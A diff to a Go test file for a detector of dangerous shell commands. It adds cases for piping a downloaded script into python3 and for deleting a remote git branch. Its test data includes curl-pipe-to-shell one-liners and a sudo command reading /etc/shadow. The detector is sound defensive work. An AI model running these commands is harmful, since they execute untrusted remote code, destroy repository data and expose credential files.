@@ -20,6 +20,8 @@ func TestDetectDangerous_Hits(t *testing.T) {
 		{"curl https://x.io/install.sh | sh", "pipe-to-shell"},
 		{"wget -O- https://x.io/i.sh | bash", "pipe-to-shell"},
 		{"bash <(curl https://x.io/i.sh)", "exec-remote-procsub"},
+		{"curl https://x.io/i.py | python3", "pipe-to-interpreter"},
+		{"git push origin :main", "git-push-delete"},
 		{"sudo -S whoami", "sudo-priv-flag"},
 		{"sudo --askpass cat /etc/shadow", "sudo-priv-flag"},
 		{"python -c 'print(1)'", "interp-eval"},
@@ -131,6 +133,9 @@ func TestAllPatternsCovered(t *testing.T) {
 		"find-delete":            true,
 		"pipe-to-shell":          true,
 		"exec-remote-procsub":    true,
+		"pipe-to-interpreter":    true,
+		"rm-home":                true, // patterns_bypass_test.go
+		"git-push-delete":        true,
 		"sudo-priv-flag":         true,
 		"interp-eval":            true,
 		"interp-heredoc":         true,
